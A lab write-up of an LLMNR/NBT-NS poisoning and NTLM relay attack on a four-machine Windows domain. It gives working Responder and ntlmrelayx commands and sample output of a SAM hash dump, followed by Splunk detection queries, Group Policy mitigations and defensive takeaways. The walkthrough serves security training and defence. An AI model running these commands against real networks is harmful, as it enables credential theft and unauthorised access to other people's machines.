# LLMNR Poisoning & NTLM Relay Attack

## Overview

This exercise demonstrates how an attacker can exploit LLMNR (Link-Local 
Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) to poison 
name resolution requests on a local network, capture NTLMv2 hashes, and 
relay those credentials to authenticate against another machine — all 
without ever cracking a password.

## Lab Environment

| Machine | OS | Role | IP |
|---------|-----|------|----|
| DC01 | Windows Server 2022 | Domain Controller | 192.168.1.10 |
| WS01 | Windows 11 | Victim Workstation | 192.168.1.20 |
| WS02 | Windows 11 | Relay Target (SMB signing disabled) | 192.168.1.30 |
| Attacker | Parrot OS | Attack Machine | 192.168.1.50 |

## Background

### What is LLMNR?

LLMNR is a protocol that allows hosts on a local network to perform name 
resolution when DNS fails. If a Windows machine tries to reach a hostname 
that doesn't exist in DNS, it broadcasts an LLMNR request to the entire 
network asking "does anyone know where this host is?"

An attacker on the same network can respond to that broadcast and say 
"yes, that's me" — causing the victim machine to send its NTLMv2 
authentication hash to the attacker.

### What is NTLM Relay?

Rather than cracking the captured hash, an NTLM relay attack takes the 
intercepted authentication attempt and immediately forwards it to another 
machine on the network. If that target machine has SMB signing disabled, 
it will accept the relayed credentials and grant access — authenticating 
as the victim user without ever knowing the plaintext password.

### Why Does This Work?

Two misconfigurations make this attack possible:
- **LLMNR and NBT-NS are enabled** — Windows enables these by default, 
  allowing attackers to respond to broadcast name resolution requests
- **SMB signing is disabled** — Windows workstations do not require SMB 
  signing by default, meaning relayed authentication cannot be verified 
  as legitimate

## Attack Walkthrough

### Step 1 — Start Responder

Responder listens on the network and responds to LLMNR/NBT-NS broadcast 
requests, poisoning them to point to the attacker machine:
```bash
sudo responder -I eth0 -dw
```

Key flags:
- `-I eth0` — network interface to listen on
- `-d` — enable DHCP poisoning
- `-w` — enable WPAD proxy server

Responder is now listening and waiting for a victim to make a failed 
name resolution request.

### Step 2 — Start ntlmrelayx

In a second terminal, start ntlmrelayx targeting WS02 (the machine with 
SMB signing disabled):
```bash
sudo ntlmrelayx.py -t smb://192.168.1.30 -smb2support
```

Key flags:
- `-t` — the target to relay credentials to
- `-smb2support` — enables SMB2 support for modern Windows targets

ntlmrelayx is now waiting to receive a captured hash from Responder and 
relay it to WS02.

### Step 3 — Trigger the Attack

On WS01, simulate a user mistyping a UNC path or accessing a non-existent 
share — a common everyday occurrence in real environments:
```
\\fileserver\documents
```

Since `fileserver` doesn't exist in DNS, Windows falls back to LLMNR and 
broadcasts the request. Responder intercepts it and responds, causing WS01 
to send its NTLMv2 hash to the attacker machine.

### Step 4 — Relay the Hash

ntlmrelayx immediately relays the captured hash to WS02. Because SMB 
signing is disabled on WS02, it accepts the authentication and grants 
access as the victim user.

Successful output looks like this:
```
[*] Authenticating against smb://192.168.1.30 as LAB\jsmith
[+] Successfully authenticated as LAB\jsmith
[+] Dumping SAM database...
Administrator:500:hash:hash:::
jsmith:1001:hash:hash:::
```

ntlmrelayx has dumped the local SAM database from WS02 — giving the 
attacker local account hashes without ever knowing jsmith's password.

## Detection

### Windows Event IDs to Monitor

| Event ID | Description | Why It Matters |
|----------|-------------|----------------|
| 4624 | Successful logon | Look for unexpected Type 3 (Network) logons |
| 4648 | Logon with explicit credentials | May indicate relay activity |
| 4672 | Special privileges assigned | Flags privileged access after relay |

### Splunk Detection Query

Flag unusual network logons that may indicate relay activity:
```
index=wineventlog EventCode=4624 Logon_Type=3
| stats count by src_ip, user, dest
| where count > 3
| sort -count
```

Flag logons where the source IP is not a domain controller 
(relay traffic typically originates from a workstation IP):
```
index=wineventlog EventCode=4624 Logon_Type=3
| where src_ip != "192.168.1.10"
| table _time, src_ip, user, dest
```

## Mitigation

### 1 — Disable LLMNR via Group Policy

This removes the attack vector entirely. On the domain controller:
```
Group Policy Management → 
Computer Configuration → 
Administrative Templates → 
Network → DNS Client → 
Turn off Multicast Name Resolution → Enabled
```

### 2 — Disable NBT-NS

On each workstation via PowerShell:
```powershell
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)
}
```

Or disable via DHCP server options if available.

### 3 — Enable SMB Signing via Group Policy

This prevents relayed credentials from being accepted:
```
Group Policy Management →
Computer Configuration →
Windows Settings →
Security Settings →
Local Policies →
Security Options →
Microsoft network server: Digitally sign communications (always) → Enabled
```

### 4 — Enforce NTLM restrictions

Consider restricting NTLM authentication entirely in favor of Kerberos 
where possible, via Group Policy:
```
Security Settings → Local Policies → Security Options →
Network security: Restrict NTLM: Outgoing NTLM traffic → Deny All
```

## Defensive Takeaways

- **LLMNR and NBT-NS should be disabled in any production environment** — 
  they serve a limited purpose in modern networks and represent a 
  significant attack surface on any local segment where an attacker 
  has a foothold.
- **SMB signing should be enforced domain-wide** — it is the single 
  most effective control against NTLM relay and costs nothing to enable 
  via Group Policy.
- **Network logon events (Type 3) are a valuable detection signal** — 
  unexpected Type 3 logons from workstation IPs, especially in short 
  timeframes, are a strong indicator of lateral movement or relay 
  activity and should be alerted on in any SOC environment.

## Tools Used

- Responder
- Impacket (ntlmrelayx)
- Splunk (detection)
- Group Policy Management Console (mitigation)

## References

- [MITRE ATT&CK - LLMNR/NBT-NS Poisoning T1557.001](https://attack.mitre.org/techniques/T1557/001/)
- [Responder GitHub](https://github.com/lgandx/Responder)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [Microsoft — Configuring SMB Signing](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-signing)
